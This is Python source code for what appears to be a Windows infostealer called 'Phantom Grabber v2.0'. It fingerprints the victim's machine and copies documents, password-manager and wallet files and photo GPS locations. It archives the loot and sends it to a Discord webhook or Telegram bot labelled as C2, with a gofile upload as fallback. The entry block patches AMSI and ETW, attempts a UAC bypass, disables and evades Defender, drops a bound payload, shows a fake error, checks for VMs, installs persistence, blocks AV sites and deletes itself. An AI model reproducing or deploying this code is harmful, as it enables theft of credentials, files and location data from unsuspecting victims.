
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [('dwLength', ctypes.wintypes.DWORD), ('dwMemoryLoad', ctypes.wintypes.DWORD), ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong), ('ullTotalPageFile', ctypes.c_ulonglong), ('ullAvailPageFile', ctypes.c_ulonglong), ('ullTotalVirtual', ctypes.c_ulonglong), ('ullAvailVirtual', ctypes.c_ulonglong), ('ullAvailExtendedVirtual', ctypes.c_ulonglong)]

    @classmethod
    def _get_hwid(cls) -> str:
        try:
            result = subprocess.run(['wmic', 'csproduct', 'get', 'uuid'], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
            for line in result.stdout.splitlines():
                line = line.strip()
                if line and line.lower() != 'uuid':
                    return line
        except Exception:
            pass
        return 'Unknown'

    @classmethod
    def _get_cpu(cls) -> str:
        cpu = platform.processor()
        if not cpu or cpu == 'unknown':
            try:
                result = subprocess.run(['wmic', 'cpu', 'get', 'name'], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if line and line.lower() != 'name':
                        return line
            except Exception:
                pass
        return cpu or 'Unknown'

    @classmethod
    def _get_gpu(cls) -> str:
        try:
            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
            gpus = []
            for line in result.stdout.splitlines():
                line = line.strip()
                if line and line.lower() != 'name':
                    gpus.append(line)
            return ', '.join(gpus) if gpus else 'Unknown'
        except Exception:
            return 'Unknown'

    @classmethod
    def _get_ram(cls) -> str:
        try:
            mem = cls.MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(cls.MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            total_gb = mem.ullTotalPhys / 1024 ** 3
            avail_gb = mem.ullAvailPhys / 1024 ** 3
            return f'{total_gb:.1f} GB (Available: {avail_gb:.1f} GB)'
        except Exception:
            return 'Unknown'

    @classmethod
    def _get_mac(cls) -> str:
        mac_int = uuid.getnode()
        mac_str = ':'.join((f'{mac_int >> 8 * i & 255:02x}' for i in reversed(range(6))))
        return mac_str.upper()

    @classmethod
    def _get_screen_resolution(cls) -> str:
        try:
            user32 = ctypes.windll.user32
            user32.SetProcessDPIAware()
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            return f'{w}x{h}'
        except Exception:
            return 'Unknown'

    @classmethod
    def _get_disk_info(cls) -> str:
        try:
            usage = shutil.disk_usage('/')
            total_gb = usage.total / 1024 ** 3
            used_gb = usage.used / 1024 ** 3
            free_gb = usage.free / 1024 ** 3
            pct = usage.used / usage.total * 100
            return f'{used_gb:.1f}/{total_gb:.1f} GB ({pct:.0f}% used, {free_gb:.1f} GB free)'
        except Exception:
            return 'Unknown'

    @classmethod
    def get_ip_info(cls) -> str:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        try:
            resp = http.request('GET', 'http://ip-api.com/json/', timeout=10.0)
            if resp.status != 200:
                return 'IP Info: Unavailable'
            data = json.loads(resp.data.decode('utf-8'))
            lines = [f"IP: {data.get('query', 'N/A')}", f"City: {data.get('city', 'N/A')}", f"Region: {data.get('regionName', 'N/A')}", f"Country: {data.get('country', 'N/A')}", f"ISP: {data.get('isp', 'N/A')}", f"Timezone: {data.get('timezone', 'N/A')}", f"Lat/Lon: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}"]
            return '\n'.join(lines)
        except Exception as e:
            cls._log.debug(f'IP info fetch failed: {e}')
            return 'IP Info: Unavailable'

    @classmethod
    def get_system_summary(cls) -> str:
        try:
            username = os.getlogin()
        except Exception:
            username = os.getenv('USERNAME', 'Unknown')
        lines = [f'OS: {platform.platform()}', f'OS Version: {platform.version()}', f"Computer Name: {os.getenv('COMPUTERNAME', 'Unknown')}", f'Username: {username}', f'HWID: {cls._get_hwid()}', f'CPU: {cls._get_cpu()}', f'GPU: {cls._get_gpu()}', f'RAM: {cls._get_ram()}', f'MAC: {cls._get_mac()}', f'Screen: {cls._get_screen_resolution()}', f'Disk: {cls._get_disk_info()}']
        return '\n'.join(lines)

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'SystemInfo')
        os.makedirs(out, exist_ok=True)
        ip_info = cls.get_ip_info()
        sys_info = cls.get_system_summary()
        combined = f'=== IP Information ===\n{ip_info}\n\n=== System Information ===\n{sys_info}\n'
        output_file = os.path.join(out, 'system_info.txt')
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(combined)
        cls._log.info(f'System info saved to {output_file}')

class CommonFiles:
    EXTENSIONS = ('.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.csv', '.rtf', '.odt', '.pptx', '.kdbx', '.key', '.wallet')
    SEARCH_DIRS = [os.path.join(os.path.expanduser('~'), 'Desktop'), os.path.join(os.path.expanduser('~'), 'Documents'), os.path.join(os.path.expanduser('~'), 'Downloads')]
    MAX_FILE_SIZE = 2 * 1024 * 1024
    MAX_FILES = 50
    _log = logging.getLogger('CommonFiles')

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'CommonFiles')
        os.makedirs(out, exist_ok=True)
        copied = 0
        for search_dir in cls.SEARCH_DIRS:
            if not os.path.isdir(search_dir):
                continue
            for root, dirs, files in os.walk(search_dir):
                dirs[:] = [d for d in dirs if not d.startswith('.') and d.lower() not in ('node_modules', '.git', '__pycache__', 'venv')]
                if copied >= cls.MAX_FILES:
                    break
                for fname in files:
                    if copied >= cls.MAX_FILES:
                        break
                    _, ext = os.path.splitext(fname)
                    if ext.lower() not in cls.EXTENSIONS:
                        continue
                    src_path = os.path.join(root, fname)
                    try:
                        fsize = os.path.getsize(src_path)
                        if fsize > cls.MAX_FILE_SIZE or fsize == 0:
                            continue
                        rel = os.path.relpath(src_path, os.path.expanduser('~'))
                        dst_path = os.path.join(out, rel)
                        os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                        shutil.copy2(src_path, dst_path)
                        copied += 1
                    except Exception as e:
                        cls._log.debug(f'Failed to copy {src_path}: {e}')
        cls._log.info(f'Copied {copied} common file(s) to {out}')

class ExifStealer:
    IMAGE_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.tiff', '.heic')
    SEARCH_DIRS = [os.path.join(os.path.expanduser('~'), 'Pictures'), os.path.join(os.path.expanduser('~'), 'Desktop'), os.path.join(os.path.expanduser('~'), 'Documents'), os.path.join(os.path.expanduser('~'), 'Downloads')]
    MAX_IMAGES = 100
    _log = logging.getLogger('ExifStealer')

    @staticmethod
    def get_decimal_from_dms(dms, ref: str) -> float:
        try:
            parts: list[float] = []
            for component in dms:
                if hasattr(component, 'numerator') and hasattr(component, 'denominator'):
                    if component.denominator == 0:
                        parts.append(0.0)
                    else:
                        parts.append(float(component.numerator) / float(component.denominator))
                elif isinstance(component, tuple) and len(component) == 2:
                    num, den = component
                    if den == 0:
                        parts.append(0.0)
                    else:
                        parts.append(float(num) / float(den))
                else:
                    parts.append(float(component))
            if len(parts) < 3:
                return 0.0
            degrees = parts[0]
            minutes = parts[1]
            seconds = parts[2]
            decimal = degrees + minutes / 60.0 + seconds / 3600.0
            if ref in ('S', 'W'):
                decimal = -decimal
            return decimal
        except Exception:
            return 0.0

    @classmethod
    def extract_exif(cls, filepath: str) -> dict | None:
        try:
            img = Image.open(filepath)
        except Exception:
            return None
        try:
            exif_data = img._getexif()
        except Exception:
            return None
        if not exif_data:
            return None
        result: dict = {'filepath': filepath, 'filename': os.path.basename(filepath), 'dimensions': f'{img.width}x{img.height}'}
        tag_data: dict = {}
        for tag_id, value in exif_data.items():
            tag_name = TAGS.get(tag_id, str(tag_id))
            tag_data[tag_name] = value
        result['make'] = str(tag_data.get('Make', '')).strip()
        result['model'] = str(tag_data.get('Model', '')).strip()
        result['datetime'] = str(tag_data.get('DateTime', '')).strip()
        result['software'] = str(tag_data.get('Software', '')).strip()
        gps_info = tag_data.get('GPSInfo')
        if gps_info and isinstance(gps_info, dict):
            gps_data: dict = {}
            for gps_tag_id, gps_value in gps_info.items():
                gps_tag_name = GPSTAGS.get(gps_tag_id, str(gps_tag_id))
                gps_data[gps_tag_name] = gps_value
            lat = gps_data.get('GPSLatitude')
            lat_ref = gps_data.get('GPSLatitudeRef', 'N')
            lon = gps_data.get('GPSLongitude')
            lon_ref = gps_data.get('GPSLongitudeRef', 'E')
            if lat and lon:
                lat_dec = cls.get_decimal_from_dms(lat, lat_ref)
                lon_dec = cls.get_decimal_from_dms(lon, lon_ref)
                if lat_dec != 0.0 or lon_dec != 0.0:
                    result['gps_lat'] = lat_dec
                    result['gps_lon'] = lon_dec
        has_gps = 'gps_lat' in result
        has_camera = bool(result.get('make') or result.get('model'))
        has_datetime = bool(result.get('datetime'))
        if has_gps or has_camera or has_datetime:
            return result
        return None

    @classmethod
    def run(cls, output_dir: str) -> None:
        out = os.path.join(output_dir, 'EXIF')
        os.makedirs(out, exist_ok=True)
        results: list[dict] = []
        scanned = 0
        for search_dir in cls.SEARCH_DIRS:
            if not os.path.isdir(search_dir):
                continue
            for root, dirs, files in os.walk(search_dir):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                if scanned >= cls.MAX_IMAGES:
                    break
                for fname in files:
                    if scanned >= cls.MAX_IMAGES:
                        break
                    _, ext = os.path.splitext(fname)
                    if ext.lower() not in cls.IMAGE_EXTENSIONS:
                        continue
                    fpath = os.path.join(root, fname)
                    scanned += 1
                    exif = cls.extract_exif(fpath)
                    if exif:
                        results.append(exif)
        if not results:
            cls._log.info('No EXIF data found')
            return
        exif_lines: list[str] = []
        gps_lines: list[str] = []
        for entry in results:
            exif_lines.append(f"=== {entry['filename']} ===")
            exif_lines.append(f"Path: {entry['filepath']}")
            exif_lines.append(f"Dimensions: {entry['dimensions']}")
            if 'gps_lat' in entry:
                lat = entry['gps_lat']
                lon = entry['gps_lon']
                exif_lines.append(f'GPS: {lat:.6f}, {lon:.6f}')
                exif_lines.append(f'Google Maps: https://maps.google.com/?q={lat:.6f},{lon:.6f}')
                gps_lines.append(f"{entry['filename']} | {lat:.6f}, {lon:.6f} | https://maps.google.com/?q={lat:.6f},{lon:.6f}")
            if entry.get('make') or entry.get('model'):
                camera = f"{entry.get('make', '')} {entry.get('model', '')}".strip()
                exif_lines.append(f'Camera: {camera}')
            if entry.get('datetime'):
                exif_lines.append(f"Date: {entry['datetime']}")
            if entry.get('software'):
                exif_lines.append(f"Software: {entry['software']}")
            exif_lines.append('---')
        with open(os.path.join(out, 'exif_data.txt'), 'w', encoding='utf-8') as f:
            f.write('\n'.join(exif_lines))
        if gps_lines:
            with open(os.path.join(out, 'gps_locations.txt'), 'w', encoding='utf-8') as f:
                f.write('\n'.join(gps_lines))
        cls._log.info(f'EXIF data extracted from {len(results)} image(s), {len(gps_lines)} with GPS -> {out}')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Exfiltrator:
    _log = logging.getLogger('Exfiltrator')

    @staticmethod
    def CreateArchive(source_dir: str, output_path: str, password: str) -> str:
        bundled_rar = os.path.join(getattr(sys, '_MEIPASS', ''), 'rar.exe')
        rar_candidates = [bundled_rar] if os.path.isfile(bundled_rar) else []
        rar_candidates += ['C:\\Program Files\\WinRAR\\rar.exe', 'C:\\Program Files (x86)\\WinRAR\\rar.exe']
        for rar_path in rar_candidates:
            if os.path.isfile(rar_path):
                try:
                    rar_output = output_path.replace('.zip', '.rar')
                    cmd = [rar_path, 'a', f'-hp{password}', '-ep1', '-m5', rar_output, source_dir]
                    result = subprocess.run(cmd, capture_output=True, timeout=120, creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode == 0 and os.path.isfile(rar_output):
                        Exfiltrator._log.info(f'Archive created with RAR: {rar_output}')
                        return rar_output
                except Exception:
                    pass
                break
        seven_z_paths = ['C:\\Program Files\\7-Zip\\7z.exe', 'C:\\Program Files (x86)\\7-Zip\\7z.exe', os.path.join(os.getenv('ProgramFiles', ''), '7-Zip', '7z.exe')]
        for sz_path in seven_z_paths:
            if os.path.isfile(sz_path):
                try:
                    cmd = [sz_path, 'a', f'-p{password}', '-tzip', '-mx=5', output_path, os.path.join(source_dir, '*')]
                    result = subprocess.run(cmd, capture_output=True, timeout=120, creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode == 0 and os.path.isfile(output_path):
                        Exfiltrator._log.info(f'Archive created with 7z: {output_path}')
                        return output_path
                except Exception:
                    pass
                break
        try:
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(source_dir):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        arcname = os.path.relpath(fpath, source_dir)
                        try:
                            zf.write(fpath, arcname)
                        except Exception:
                            continue
            Exfiltrator._log.info(f'Archive created (no password): {output_path}')
            return output_path
        except Exception as e:
            Exfiltrator._log.error(f'Archive creation failed: {e}')
            return output_path

    @staticmethod
    def UploadToExternalService(filepath: str, filename: str) -> str | None:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        try:
            resp = http.request('GET', 'https://api.gofile.io/servers', timeout=15.0)
            if resp.status != 200:
                return None
            data = json.loads(resp.data.decode('utf-8'))
            if data.get('status') != 'ok':
                return None
            servers = data.get('data', {}).get('servers', [])
            if not servers:
                return None
            server = servers[0].get('name', 'store1')
        except Exception as e:
            Exfiltrator._log.debug(f'Gofile server fetch failed: {e}')
            return None
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
            boundary = f'----PhantomBoundary{int(time.time())}'
            body = b''
            body += f'--{boundary}\r\n'.encode()
            body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
            body += b'Content-Type: application/octet-stream\r\n\r\n'
            body += file_data
            body += f'\r\n--{boundary}--\r\n'.encode()
            resp = http.request('POST', f'https://{server}.gofile.io/contents', body=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}, timeout=300.0)
            if resp.status == 200:
                result = json.loads(resp.data.decode('utf-8'))
                if result.get('status') == 'ok':
                    download_url = result.get('data', {}).get('downloadPage', '')
                    Exfiltrator._log.info(f'Uploaded to gofile: {download_url}')
                    return download_url
        except Exception as e:
            Exfiltrator._log.debug(f'Gofile upload failed: {e}')
        return None

    @staticmethod
    def SendDiscordWebhook(archive_path: str, filename: str, ip_info: str, system_info: str, grabbed_info: str) -> None:
        webhook_url = Settings.C2[1]
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        embed = {'title': '👻 Phantom Grabber — New Hit', 'color': 8073150, 'fields': [{'name': '🌐 IP Info', 'value': f'```\n{ip_info[:1000]}\n```', 'inline': False}, {'name': '💻 System', 'value': f'```\n{system_info[:1000]}\n```', 'inline': False}, {'name': '📦 Grabbed', 'value': f'```\n{grabbed_info[:1000]}\n```', 'inline': False}], 'footer': {'text': 'Phantom Grabber v2.0'}}
        content = ''
        if Settings.PingMe:
            content = '@everyone'
        file_size = os.path.getsize(archive_path) if os.path.isfile(archive_path) else 0
        if file_size > 25 * 1024 * 1024:
            gofile_url = Exfiltrator.UploadToExternalService(archive_path, filename)
            if gofile_url:
                embed['fields'].append({'name': '📁 Download', 'value': f'[GoFile Link]({gofile_url})', 'inline': False})
            payload = json.dumps({'content': content, 'embeds': [embed]}).encode('utf-8')
            try:
                http.request('POST', webhook_url, body=payload, headers={'Content-Type': 'application/json'}, timeout=30.0)
                Exfiltrator._log.info('Discord webhook sent (gofile link)')
            except Exception as e:
                Exfiltrator._log.error(f'Discord webhook failed: {e}')
        else:
            boundary = f'----PhantomBoundary{int(time.time())}'
            payload_json = json.dumps({'content': content, 'embeds': [embed]})
            body = b''
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="payload_json"\r\n'
            body += b'Content-Type: application/json\r\n\r\n'
            body += payload_json.encode('utf-8')
            body += b'\r\n'
            if os.path.isfile(archive_path):
                with open(archive_path, 'rb') as f:
                    file_data = f.read()
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
                body += b'Content-Type: application/octet-stream\r\n\r\n'
                body += file_data
                body += b'\r\n'
            body += f'--{boundary}--\r\n'.encode()
            try:
                http.request('POST', webhook_url, body=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}, timeout=120.0)
                Exfiltrator._log.info('Discord webhook sent with attachment')
            except Exception as e:
                Exfiltrator._log.error(f'Discord webhook failed: {e}')

    @staticmethod
    def SendTelegram(archive_path: str, filename: str, ip_info: str, system_info: str, grabbed_info: str) -> None:
        parts = Settings.C2[1].split('$', 1)
        if len(parts) != 2:
            Exfiltrator._log.error('Invalid Telegram C2 config')
            return
        bot_token, chat_id = parts
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        base_url = f'https://api.telegram.org/bot{bot_token}'
        caption = f'<b>👻 Phantom Grabber — New Hit</b>\n\n<b>🌐 IP Info:</b>\n<pre>{ip_info[:800]}</pre>\n\n<b>💻 System:</b>\n<pre>{system_info[:800]}</pre>\n\n<b>📦 Grabbed:</b>\n<pre>{grabbed_info[:800]}</pre>'
        file_size = os.path.getsize(archive_path) if os.path.isfile(archive_path) else 0
        if file_size > 40 * 1024 * 1024:
            gofile_url = Exfiltrator.UploadToExternalService(archive_path, filename)
            download_note = f'\n\n<b>📁 Download:</b> {gofile_url}' if gofile_url else ''
            message_text = caption + download_note
            try:
                payload = json.dumps({'chat_id': chat_id, 'text': message_text, 'parse_mode': 'HTML'}).encode('utf-8')
                http.request('POST', f'{base_url}/sendMessage', body=payload, headers={'Content-Type': 'application/json'}, timeout=30.0)
                Exfiltrator._log.info('Telegram message sent (gofile link)')
            except Exception as e:
                Exfiltrator._log.error(f'Telegram sendMessage failed: {e}')
        else:
            boundary = f'----PhantomBoundary{int(time.time())}'
            body = b''
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            body += chat_id.encode('utf-8')
            body += b'\r\n'
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="caption"\r\n\r\n'
            body += caption.encode('utf-8')
            body += b'\r\n'
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n'
            body += b'HTML\r\n'
            if os.path.isfile(archive_path):
                with open(archive_path, 'rb') as f:
                    file_data = f.read()
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode()
                body += b'Content-Type: application/octet-stream\r\n\r\n'
                body += file_data
                body += b'\r\n'
            body += f'--{boundary}--\r\n'.encode()
            try:
                http.request('POST', f'{base_url}/sendDocument', body=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}, timeout=120.0)
                Exfiltrator._log.info('Telegram document sent')
            except Exception as e:
                Exfiltrator._log.error(f'Telegram sendDocument failed: {e}')

    @classmethod
    def run(cls, temp_dir: str) -> None:
        ip_info = SystemInfo.get_ip_info()
        system_info = SystemInfo.get_system_summary()
        grabbed_parts: list[str] = []
        for subdir in os.listdir(temp_dir):
            subpath = os.path.join(temp_dir, subdir)
            if os.path.isdir(subpath):
                file_count = sum((1 for _, _, fs in os.walk(subpath) for _ in fs))
                if file_count > 0:
                    grabbed_parts.append(f'{subdir}: {file_count} file(s)')
        grabbed_info = '\n'.join(grabbed_parts) if grabbed_parts else 'No data collected'
        try:
            username = os.getlogin()
        except Exception:
            username = os.getenv('USERNAME', 'user')
        archive_name = f'{username}_phantom.zip'
        archive_path = os.path.join(os.getenv('temp', os.path.dirname(temp_dir)), archive_name)
        archive_path = cls.CreateArchive(temp_dir, archive_path, Settings.ArchivePassword)
        match Settings.C2[0]:
            case 0:
                cls.SendDiscordWebhook(archive_path, archive_name, ip_info, system_info, grabbed_info)
            case 1:
                cls.SendTelegram(archive_path, archive_name, ip_info, system_info, grabbed_info)
            case _:
                cls._log.error(f'Unknown C2 type: {Settings.C2[0]}')
        try:
            if os.path.isfile(archive_path):
                os.remove(archive_path)
        except Exception:
            pass
        cls._log.info('Exfiltration complete')

class PhantomGrabber:

    def __init__(self):
        self.TempDir = os.path.join(os.getenv('temp', tempfile.gettempdir()), 'phantom_' + uuid.uuid4().hex[:8])
        os.makedirs(self.TempDir, exist_ok=True)
        self.ArchivePath = os.path.join(os.getenv('temp', tempfile.gettempdir()), f'{os.getlogin()}_{uuid.uuid4().hex[:6]}.zip')
        Logger.info('Starting data collection')
        self.collect()
        Logger.info('Starting exfiltration')
        Exfiltrator.run(self.TempDir)
        Logger.info('Cleaning up')
        self.cleanup()

    def _run_module(self, func, *args):
        try:
            func(*args)
        except Exception as e:
            Logger.debug(f'Module {func.__qualname__} failed: {e}')

    def collect(self):
        threads: list[threading.Thread] = []
        module_map = {'CapturePasswords': lambda: Browsers.run(self.TempDir), 'CaptureCookies': lambda: None, 'CaptureHistory': lambda: None, 'CaptureAutofills': lambda: None, 'CaptureCreditCards': lambda: None, 'CaptureDiscordTokens': lambda: Discord.run(self.TempDir), 'CaptureWallets': lambda: Wallets.run(self.TempDir), 'CaptureTelegram': lambda: Telegram.run(self.TempDir), 'CaptureWifiPasswords': lambda: Wifi.run(self.TempDir), 'CaptureGames': lambda: Games.run(self.TempDir), 'CaptureWebcam': lambda: Webcam.run(self.TempDir), 'CaptureScreenshot': lambda: Screenshot.run(self.TempDir), 'CaptureSystemInfo': lambda: SystemInfo.run(self.TempDir), 'CaptureCommonFiles': lambda: CommonFiles.run(self.TempDir), 'CaptureExif': lambda: ExifStealer.run(self.TempDir)}
        browser_queued = False
        for setting_name, runner in module_map.items():
            try:
                enabled = getattr(Settings, setting_name, False)
            except AttributeError:
                enabled = False
            if not enabled:
                continue
            if setting_name in ('CapturePasswords', 'CaptureCookies', 'CaptureHistory'):
                if not browser_queued:
                    browser_queued = True
                    t = threading.Thread(target=self._run_module, args=(Browsers.run, self.TempDir), daemon=True)
                    threads.append(t)
                continue
            t = threading.Thread(target=self._run_module, args=(runner,), daemon=True)
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=60)
        Logger.info(f'Collection complete. {len(threads)} module(s) executed.')

    def cleanup(self):
        try:
            shutil.rmtree(self.TempDir, ignore_errors=True)
        except Exception:
            pass
        try:
            if os.path.isfile(self.ArchivePath):
                os.remove(self.ArchivePath)
        except Exception:
            pass
if __name__ == '__main__' and os.name == 'nt':
    Logger.info('Process started')
    if Settings.HideConsole:
        Syscalls.HideConsole()
    Syscalls.PatchAmsi()
    Syscalls.PatchEtw()
    if not Utility.IsAdmin():
        Logger.warning('Admin privileges not available')
        if Utility.GetSelf()[1]:
            if '--nouacbypass' not in sys.argv and Settings.UacBypass:
                Logger.info('Attempting UAC bypass')
                if Utility.UACbypass():
                    os._exit(0)
                else:
                    Logger.warning('UAC bypass failed')
                    if not Utility.IsInStartup():
                        if Utility.UACPrompt(sys.executable):
                            os._exit(0)
            if not Utility.IsInStartup() and (not Settings.UacBypass):
                if Utility.UACPrompt(sys.executable):
                    os._exit(0)
    Logger.info('Creating mutex')
    if not Syscalls.CreateMutex(Settings.Mutex):
        Logger.info('Mutex exists, exiting')
        os._exit(0)
    if Utility.GetSelf()[1]:
        Logger.info('Excluding from Defender')
        Utility.ExcludeFromDefender()
    Logger.info('Disabling Defender')
    Utility.DisableDefender()
    if Utility.GetSelf()[1] and (Settings.RunBoundOnStartup or not Utility.IsInStartup()):
        bound_src = os.path.join(sys._MEIPASS, 'bound.blank') if hasattr(sys, '_MEIPASS') else ''
        if os.path.isfile(bound_src):
            try:
                bound_dst = os.path.join(os.getenv('temp', ''), 'bound.exe')
                if os.path.isfile(bound_dst):
                    os.remove(bound_dst)
                with open(bound_src, 'rb') as f:
                    content = f.read()
                decrypted = zlib.decompress(content[::-1])
                with open(bound_dst, 'wb') as f:
                    f.write(decrypted)
                Utility.ExcludeFromDefender(bound_dst)
                subprocess.Popen('start bound.exe', shell=True, cwd=os.path.dirname(bound_dst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            except Exception as e:
                Logger.error(e)
    if Utility.GetSelf()[1] and Settings.FakeError[0] and (not Utility.IsInStartup()):
        try:
            title = Settings.FakeError[1][0]
            message = Settings.FakeError[1][1]
            icon = Settings.FakeError[1][2]
            cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+16);close()"'''
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except Exception as e:
            Logger.error(e)
    if not Settings.Vmprotect or not VmProtect.isVM():
        if Utility.GetSelf()[1]:
            if Settings.Melt and (not Utility.IsInStartup()):
                Utility.HideSelf()
        elif Settings.Melt:
            Utility.DeleteSelf()
        try:
            if Utility.GetSelf()[1] and Settings.Startup and (not Utility.IsInStartup()):
                path = Utility.PutInStartup()
                if path:
                    Utility.ExcludeFromDefender(path)
                Utility.CreateScheduledTask()
        except Exception:
            Logger.error('Failed persistence setup')
        if Settings.BlockAvSites:
            Utility.BlockAvSites()
        if Settings.DiscordInjection and Settings.Injection:
            Utility.InjectDiscord(Settings.Injection)
        while True:
            try:
                if Utility.IsConnectedToInternet():
                    Logger.info('Internet available, starting collection')
                    PhantomGrabber()
                    Logger.info('Collection complete')
                    break
                else:
                    Logger.info('No internet, retrying in 10s')
                    time.sleep(10)
            except KeyboardInterrupt:
                os._exit(1)
            except Exception as e:
                Logger.critical(e, exc_info=True)
                Logger.info('Error occurred, retrying in 10 minutes')
                time.sleep(600)
        if Utility.GetSelf()[1] and Settings.Melt and (not Utility.IsInStartup()):
            Utility.DeleteSelf()
        Logger.info('Process ended')